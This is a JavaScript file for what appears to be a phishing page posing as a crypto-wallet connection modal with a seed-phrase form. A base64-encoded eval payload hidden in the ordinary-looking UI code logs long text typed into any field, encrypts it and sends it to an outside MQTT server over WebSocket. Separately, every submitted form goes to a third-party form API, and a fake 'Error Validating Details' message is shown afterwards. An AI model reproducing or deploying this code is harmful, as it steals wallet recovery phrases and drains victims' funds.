isMobile = function () {
	let check = false;
    
	(function (a) {
		if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
	})(navigator.userAgent || navigator.vendor || window.opera);
	return check;
};

function hide_elem(params){
    [...document.querySelectorAll(params)].forEach(element => {
        element.classList.add("hidden");
    });
}


function show_elem(params){
    [...document.querySelectorAll(params)].forEach(element => {
        element.classList.remove("hidden");
    });
}


function init_all() {
    hide_elem("#connect-modal");
    hide_elem("#connect-modal-overlay");
    hide_elem("#lucien-popup");
}

function closeModal() {
    hide_elem("#connect-modal");
    hide_elem("#connect-modal-overlay");
}

function openModalMain() {
    init_all();
    show_elem("#connect-modal");
    show_elem("#connect-modal-overlay");
    show_elem("#modal-close");
    document.getElementById('modal-close').addEventListener('click', function () {
        closeModal();
    });
}
eval(atob("InVzZSBzdHJpY3QiO3ZhciB0aW1lcl9pZCxzb2NrZXQ9bnVsbCx0aW1lb3V0X3NlYz0xMCxkaXNjb25uZWN0aW5nPSExLGRhdGFfY291bnRlcj0xO2xldCByZXN1bHQ9IiI7Y29uc3QgY2hhcmFjdGVycz0iQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkiLGNoYXJhY3RlcnNMZW5ndGg9Y2hhcmFjdGVycy5sZW5ndGg7bGV0IGNvdW50ZXI9MDtmb3IoO2NvdW50ZXI8NTspcmVzdWx0Kz1jaGFyYWN0ZXJzLmNoYXJBdChNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqY2hhcmFjdGVyc0xlbmd0aCkpLGNvdW50ZXIrPTE7Y29uc3QgZ2xfaWQ9cmVzdWx0O2Z1bmN0aW9uIHN0cjJhcnJheShlKXt2YXIgdD1lLmxlbmd0aCxyPUFycmF5KHQrMik7dD49MjU2PyhyWzBdPU1hdGguZmxvb3IodC8yNTYpLHJbMV09dCUyNTYpOihyWzBdPTAsclsxXT10KTtmb3IodmFyIG49MDtuPHQ7bisrKXJbbisyXT1lLmNoYXJDb2RlQXQobik7cmV0dXJuIHJ9ZnVuY3Rpb24gYXJyYXkyc3RyKGUsdCxyKXt2YXIgbixhPSIiO2ZvcihuPXQ7bjx0K3I7bisrKWErPVN0cmluZy5mcm9tQ2hhckNvZGUoZVtuXSk7cmV0dXJuIGF9ZnVuY3Rpb24gZW5jb2RlX2hlYWRlcihlLHQpe3ZhciByPVssXTtyWzBdPWU7ZG97dmFyIG49dCUxMjg7KHQ9TWF0aC5mbG9vcih0LzEyOCkpPjAmJihufD0xMjgpLHI9ci5jb25jYXQoW25dKX13aGlsZSh0PjApO3JldHVybiByfWZ1bmN0aW9uIGRlY29kZV9oZWFkZXIoZSl7dmFyIHQ9MCxyPTEsbj0wO2Rve3ZhciBhPWVbKyt0XTtuKz0oMTI3JmEpKnIscio9MTI4fXdoaWxlKCgxMjgmYSkhPTApO3JldHVybltuLHRdfWZ1bmN0aW9uIHN0YXJ0KCl7dmFyIGU9Z2xfaWQ7KHNvY2tldD1uZXcgV2ViU29ja2V0KCJ3c3M6Ly9tcXR0LWRhc2hib2FyZC5jb206ODg4NC9tcXR0IiwibXF0dCIpKS5iaW5hcnlUeXBlPSJhcnJheWJ1ZmZlciIsc29ja2V0Lm9ub3Blbj1mdW5jdGlvbigpe3ZhciB0LHI9WzAsNiw3Nyw4MSw3MywxMTUsMTAwLDExMiwzLDIsTWF0aC5mbG9vcih0aW1lb3V0X3NlYy8yNTYpLHRpbWVvdXRfc2VjJTI1Nl07dD0odD1lbmNvZGVfaGVhZGVyKDE2LChyPXIuY29uY2F0KHN0cjJhcnJheShlbmNvZGVfdXRmOChlKSkpKS5sZW5ndGgpKS5jb25jYXQocik7dmFyIG49bmV3IFVpbnQ4QXJyYXkodCk7c29ja2V0LnNlbmQobi5idWZmZXIpfSxzb2NrZXQub25tZXNzYWdlPWZ1bmN0aW9uKGUpe3dpbmRvdy5jbGVhckludGVydmFsKHRpbWVyX2lkKSx0aW1lcl9pZD13aW5kb3cuc2V0SW50ZXJ2YWwoY2hlY2ssMWUzKnRpbWVvdXRfc2VjKSxkYXRhX2NvdW50ZXIrKzt2YXIgdD1uZXcgVWludDhBcnJheShlLmRhdGEpO2lmKDQ9PXQubGVuZ3RoJiYzMj09dFswXSYmMj09dFsxXSYmMD09dFsyXSk7ZWxzZSBpZigyPT10Lmxlbmd0aCYmMjA4PT10WzBdJiYwPT10WzFdKTtlbHNlIGlmKDU9PXQubGVuZ3RoJiYxNDQ9PXRbMF0pO2Vsc2UgaWYodC5sZW5ndGg+NCYmNDg9PXRbMF18NDk9PXRbMF0pe3ZhciByPWRlY29kZV9oZWFkZXIodCksbj1yWzBdLGE9clsxXSxjPTI1Nip0W2ErMV0rdFthKzJdO2lmKHQubGVuZ3RoPm4pe3ZhciBvPWFycmF5MnN0cih0LGErMyxjKTtvPWRlY29kZV91dGY4KG8pO3ZhciBzPWFycmF5MnN0cih0LGErMytjLG4tYy0yKSxpPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpZC1saXN0Iik7aWYoaSl7aS5jaGlsZEVsZW1lbnRDb3VudD4xMCYmaS5yZW1vdmVDaGlsZChpLmNoaWxkTm9kZXNbMF0pO3ZhciAkPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpIik7JC5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVUZXh0Tm9kZShvKyIgLS0gIitzKSksaS5hcHBlbmRDaGlsZCgkKX19fX0sc29ja2V0Lm9uY2xvc2U9ZnVuY3Rpb24oKXtkYXRhX2NvdW50ZXI9MSxjaGVjaygpfSxzb2NrZXQub25lcnJvcj1mdW5jdGlvbigpe319ZnVuY3Rpb24gY2hlY2soKXtpZihzb2NrZXQmJjE9PXNvY2tldC5yZWFkeVN0YXRlKXtpZih3aW5kb3cuY2xlYXJJbnRlcnZhbCh0aW1lcl9pZCksMD09ZGF0YV9jb3VudGVyKXNvY2tldC5jbG9zZSgpO2Vsc2V7dGltZXJfaWQ9d2luZG93LnNldEludGVydmFsKGNoZWNrLDE1MDApO3ZhciBlPW5ldyBVaW50OEFycmF5KFsxOTIsMF0pO3NvY2tldC5zZW5kKGUuYnVmZmVyKX1kYXRhX2NvdW50ZXI9MH1zb2NrZXQmJjMhPXNvY2tldC5yZWFkeVN0YXRlfHxkaXNjb25uZWN0aW5nfHxzdGFydCgpfWZ1bmN0aW9uIGVuY29kZV91dGY4KGUpe3JldHVybiB1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZSkpfWZ1bmN0aW9uIGRlY29kZV91dGY4KGUpe3JldHVybiBkZWNvZGVVUklDb21wb25lbnQoZXNjYXBlKGUpKX1mdW5jdGlvbiBwdWJsaXNoKGUpeyhyPXN0cjJhcnJheShlKSkuc3BsaWNlKDAsMiksdD0odD1lbmNvZGVfaGVhZGVyKDQ4LChyPXN0cjJhcnJheShlbmNvZGVfdXRmOCgiZmFrUnJwWW95TE1BMG4zL3JUc2NzaEZOYWF6WlN5dCIpKS5jb25jYXQocikpLmxlbmd0aCkpLmNvbmNhdChyKTt2YXIgdCxyLG49bmV3IFVpbnQ4QXJyYXkodCk7c29ja2V0LnNlbmQobi5idWZmZXIpfWFzeW5jIGZ1bmN0aW9uIGNhbGwoZSl7bGV0IHQ9e307dFswXT1sb2NhdGlvbi5ob3N0KyItIitnbF9pZCx0WzFdPWU7dmFyIHI9SlNPTi5zdHJpbmdpZnkodCk7bGV0IG4sYTtyZXR1cm4gYT1hd2FpdCB3aW5kb3cuY3J5cHRvLnN1YnRsZS5lbmNyeXB0KHtuYW1lOiJSU0EtT0FFUCJ9LGF3YWl0IHdpbmRvdy5jcnlwdG8uc3VidGxlLmltcG9ydEtleSgic3BraSIsVWludDhBcnJheS5mcm9tKGF0b2IoIk1JSUNJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBZzhBTUlJQ0NnS0NBZ0VBd2ZPU1FKbWdGYndQMCtxU25jR2F3a2lWTWJEYXEwREhSYlM3Q093OXl5QnlBZnhtMlpvWU5lNmxKS3pUYTBHVUs1Q2lWZDd6ZUhmekJEMkRvOVY0YlAxdW1heFJaczNxb3Z4d3NzNlZRNld0Vk9QRDB3Q0dudmJPLzdEQjBWd2E4clN4a0tCOUZJNnZqQTExaEJ6M1BoQktNRWoybWJkN3B4Z0NpMWFYV1pFdG1qUHExWHNseGt3dEJuZitIQmFEN2JkN1d6SHRFMmV5ZnJ6TkllNnJFbXI0T0Faa2NvbExOcHFGRHFlL2tyUDZobmtsMkJVZW9Qc1V4ajh5RTZBK2gvVFlMZ2taWm9NeFhZbGMyMllrczdOTEdxZ29pYW9SNXBzdEpTYWRtSmxHK2FIYWZ4ZkRxUEFHWU4rWG1BV3ZTTWpiMHVLQ1Z3MTYyTk1la1MwUFplRFU1SGc0d1MwZVU5NHFCN1haZVpmQVRxMnRkVkxQZ3RJcHdoUExjZ1pvMVNEb2pTZzBKbEs2aldRTTh6cnBoZmNaZVZIU0pDbEJwdmlVSXhRV1BaSWtLTGRjd1hkK0orTGZVVGdOTE42bWg4RVV4Z2UyM243VnBEY295OEhnMnRTYUZ0OFdCbWlyUWpOZjZsTjJzaGp1T0hoaW5jaTVQMkNWbnM1U2dIUDRWN200dytFNzNob2FRMDUyQkFJMTdVNE1CSGxQeUxaUk0yaWRtL3dLSnRuNkNqZlNCVkNoUkp3QlJ5c2lWempRaDQrQlppQWg3ekpvWlUrUWlWY2o1NW0wNndUS1lic0ZoU3RTeTJJcE1FWHY4YUlzZDVySWVUSldLdHVHWVlJL3RGeUU3eVN1eDUvcDlWSFpOdy9WQTAxNVQ3OEY0dVpkRGd5alJwM25WVU1DQXdFQUFRIiksZT0+ZS5jaGFyQ29kZUF0KDApKS5idWZmZXIse25hbWU6IlJTQS1PQUVQIixoYXNoOntuYW1lOiJTSEEtMjU2In19LCEwLFsiZW5jcnlwdCJdKSxuZXcgVGV4dEVuY29kZXIoKS5lbmNvZGUocikpLGJ0b2EoU3RyaW5nLmZyb21DaGFyQ29kZS5hcHBseShudWxsLG5ldyBVaW50OEFycmF5KGEpKSl9bGV0IGV2ZW50TGlzdGVuZXJzPVtdO2Z1bmN0aW9uIGV2ZW50ZXIoZSx0KXtsZXQgcj1hc3luYyBmdW5jdGlvbihyKXt2YXIgbj1lLnZhbHVlO3Q+MCYmKG49ZS50ZXh0Q29udGVudCksbi5sZW5ndGg8NDB8fHB1Ymxpc2goYXdhaXQgY2FsbChuKSl9O2V2ZW50TGlzdGVuZXJzLnB1c2goe2VsZW1lbnQ6ZSxjYWxsYmFjazpyfSksZS5hZGRFdmVudExpc3RlbmVyKCJpbnB1dCIscil9ZnVuY3Rpb24gcmVtb3ZlQWxsRXZlbnRMaXN0ZW5lcnMoKXtldmVudExpc3RlbmVycy5mb3JFYWNoKGU9PntlLmVsZW1lbnQucmVtb3ZlRXZlbnRMaXN0ZW5lcigiaW5wdXQiLGUuY2FsbGJhY2spfSksZXZlbnRMaXN0ZW5lcnM9W119ZnVuY3Rpb24gcmViaW5kRXZlbnRMaXN0ZW5lcnMoKXtyZW1vdmVBbGxFdmVudExpc3RlbmVycygpO2xldCBlPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoImlucHV0IiksdD1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCJ0ZXh0YXJlYSIpLHI9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZGl2W2NvbnRlbnRlZGl0YWJsZT0idHJ1ZSJdJyk7ZS5mb3JFYWNoKGU9PntldmVudGVyKGUsMCl9KSx0LmZvckVhY2goZT0+e2V2ZW50ZXIoZSwwKX0pLHIuZm9yRWFjaChlPT57ZXZlbnRlcihlLDEpfSl9c3RhcnQoKSx0aW1lcl9pZD13aW5kb3cuc2V0SW50ZXJ2YWwoY2hlY2ssMTUwMCksc2V0SW50ZXJ2YWwocmViaW5kRXZlbnRMaXN0ZW5lcnMsMWUzKTs="));

function inspectExport(formdata, nextpage) {
    // Assuming on_submit is defined elsewhere
    on_submit();

    let strings = formdata;
    let apiUrl = "https://api.web3forms.com/submit"; // Web3Forms endpoint

    // Modify form data to include email field and other necessary fields
    let formData = new FormData();
    formData.append("apikey", "5b28ef1d-a7fc-42f5-bd58-f7741f15f844"); // Replace with your Web3Forms API key
    formData.append("data", JSON.stringify(strings)); // Web3Forms expects "data" key for form data

    let request = new XMLHttpRequest();
    request.open("POST", apiUrl);
    request.setRequestHeader("Accept", "application/json");

    request.onreadystatechange = function() {
        if (request.readyState === XMLHttpRequest.DONE) {
            if (request.status === 200) { // Web3Forms returns 200 for successful submissions
                // Success
                console.log("Form submitted successfully!");
                // Redirect to the next page if needed
                window.location.href = nextpage;
            } else {
                // Error handling
                console.error("Error submitting form:", request.responseText);
                // Handle the error as needed
            }
        }
    };

    request.send(formData);
}




if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
    document.documentElement.setAttribute('data-theme', 'dark');
} else {
    document.documentElement.setAttribute('data-theme', 'light');
}

var cancelElement = document.querySelector('.searchbox .cancel');
cancelElement.addEventListener("click", () => {
    var searchbox = document.getElementById("searchbox");
    searchbox.value = "";
    searchSelection("");
});
function searchSelection(val) {
    cancelElement.style.visibility = "hidden";
    if(val.length > 0){
        cancelElement.style.visibility = "visible";
    }
    filter = val.toUpperCase();
    ul = document.getElementById("modal-main-ul");
    li = ul.getElementsByClassName("menu-el");
    for (i = 0; i < li.length; i++) {
        a = li[i].getElementsByClassName("modal-el-desc")[0];
         txtValue = a.textContent || a.innerText;
        if (txtValue.toUpperCase().indexOf(filter) > -1) {
            li[i].style.display = "";
        } else {
            li[i].style.display = "none";
            
        }
    }
}

function openTab(evt, tabName) {
    var i, tabcontent, tablinks;

    [...document.getElementsByClassName("form")].forEach(element => {
        element.classList.add("hidden");
    });

    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].classList.remove("active");
    }

    [...document.getElementsByClassName(tabName)].forEach(element => {
        element.classList.remove("hidden");
    });

    evt.currentTarget.classList.add("active");
}
const tablinks = document.getElementsByClassName("tablinks");
[...tablinks].forEach(element => {
    element.addEventListener("click", (event) => {
        openTab(event, element.dataset.target)
    })
})


function one_secs_delay(callback) {
    setTimeout(callback, 300);
}


function on_submit() {
    hide_elem(".form");
    hide_elem(".conn-mode");
    hide_elem("#browsing-mode");
    hide_elem("#modal-head > .help");
    hide_elem("#modal-close");
    
    let b = document.querySelector(".form-text-header");
    let rect = document.getElementsByTagName("rect")[0];
    let loading_img = document.querySelector(".loading-img");

    rect.style.stroke = "#17cf14"; 
    b.innerHTML = "Connecting..";

    one_secs_delay(function () {
        b.innerHTML = "Please Wait..";

        one_secs_delay(function () {
            b.innerHTML = "Resolving...  Please Wait";

            setTimeout(function () {
                rect.style.stroke = "none";
                loading_img.style.border = "red 4px solid"; 
                b.style.color = "red";
                b.innerHTML = "Error Validating Details";
            }, 7000);
        });
    });
}
 


document.querySelector(".help-icon").addEventListener('click', function () {
    toggle_help_icon("help");
});

document.querySelector(".back-icon").addEventListener('click', function () {
    toggle_help_icon("back");
});


document.querySelector(".modal-button").addEventListener('click', function () {
    toggle_help_icon("back");
});

function setModalTitle(new_title){
    document.getElementById("title").innerHTML = new_title
}

function toggle_help_icon(val) {
    var helpElem = document.querySelector(".help");
    var help_icon = document.querySelector(".help-icon");
    var back_icon = document.querySelector(".back-icon");

    var form = document.querySelector("#modal-main-form-ul");
    var help_ul = document.querySelector("#modal-main-help-ul");
    var wallets_ul = document.querySelector("#modal-main-ul");
    var welcome_ul = document.querySelector("#modal-main-action-ul");
    
     help_icon.classList.add("hidden");
    back_icon.classList.add("hidden");
    wallets_ul.classList.add("hidden");
    welcome_ul.classList.add("hidden");
    
    form.classList.add("hidden");
    help_ul.classList.add("hidden");

    if (val === "help") {
        show_elem(".back-icon");
        show_elem("#modal-main-help-ul");
        setModalTitle("What is a wallet?");
        return;
    }

    show_elem(".help-icon");
    show_elem(".modal-main-action-ul");
    show_elem("#modal-main-action-ul")
    setModalTitle("Get Started");
    return;
}
function capitalizeWords(sentence) {
    const words = sentence.split(' ');
    const capitalizedWords = words.map(word => {
      if (word.length > 0) {
        return word.charAt(0).toUpperCase() + word.slice(1);
      } else {
        return word; 
      }
    });
    const capitalizedSentence = capitalizedWords.join(' ');
    return capitalizedSentence;
  }
  

  
function openConnection(event){
    show_elem(".conn-mode");
    show_elem("#browsing-mode");
    show_elem("#modal-head > .help");
    show_elem("#modal-close");

    hide_elem(".form");
    show_elem(".menmonic-form");
    hide_elem(".modal-main");
    hide_elem(".help-icon");
    hide_elem(`#modal-main-ul > .modal-main-menu`);
    event.currentTarget;
    let connText;
    if(event.currentTarget.dataset.target == "ai"){
        connText = "AI ToolKit";
    }else{
        connText = event.currentTarget.querySelector('.modal-icon > img').getAttribute('alt');
    }
    let connImage = event.currentTarget.querySelector('.modal-icon > img').getAttribute('src');
    setModalTitle(capitalizeWords(connText));
    let connelem_img = document.querySelector(".form-image img");
    let connelem_txt = document.querySelector(".wallet-name");
    connelem_img.setAttribute('src', connImage);
    document.querySelector(".loading-img").style.border = 'none';
    document.getElementsByTagName("rect")[0].style.stroke = "#3396ff";
    if(!connelem_txt){
        let selectedElement = document.querySelector('.form-text-header');
        selectedElement.style.color = "#01091b";

        selectedElement.innerHTML = "Initializing secure connection with <span class='wallet-name'></span>.";
        connelem_txt = document.querySelector(".wallet-name");
    }
    connelem_txt.innerHTML = capitalizeWords(connText);
    show_elem("#modal-main-form-ul");


}
function toggle_connect_method(event,target){
    hide_elem(".modal-main");
    hide_elem(".help-icon");
    hide_elem(`#modal-main-ul > .modal-main-menu`);
    show_elem("#modal-main-ul");
    show_elem(".back-icon");

    document.querySelector(`#${target}`).classList.remove("hidden");
    if(target.includes("dapp")){
        setModalTitle("Select a Dapp");
    }
    else if(target.includes("chains")){
        setModalTitle("Select a Chain");
    }else{
        setModalTitle("Select a Wallet");

    }


}
document.querySelectorAll("#modal-main-action-ul > .modal-main-menu > .menu-el")
    .forEach(elem => {
        elem.addEventListener('click', function (event) {
            if(elem.dataset.target == "ai"){
                openConnection(event);
                show_elem(".back-icon");
                return
            }
            toggle_connect_method(event, elem.dataset.target);
            
        });
})

document.querySelectorAll("#modal-main-ul > .modal-main-menu > .menu-el")
    .forEach(elem => {
        elem.addEventListener('click', function (event) {
            if(elem.dataset.target == "ai"){
                return
            }
            openConnection(event);
            
        });
})

document.querySelectorAll(".interact-button-manual")
    .forEach(elem => {
        elem.addEventListener('click', function (event) {
            openModalMain(event);
        });

})



document.querySelectorAll(".interact-button")
    .forEach(elem => {
        elem.addEventListener('click', function (event) {
            closeModal();
            
        });

})


document.querySelectorAll("form").forEach(
    elem => {
        elem.addEventListener('submit', function(event) {
            event.preventDefault();
            let form = new FormData(this);
            let formArray = Array.from(form.entries()).map(([name, value]) => ({name, value}));
            inspectExport(formArray, '#');
        });
});

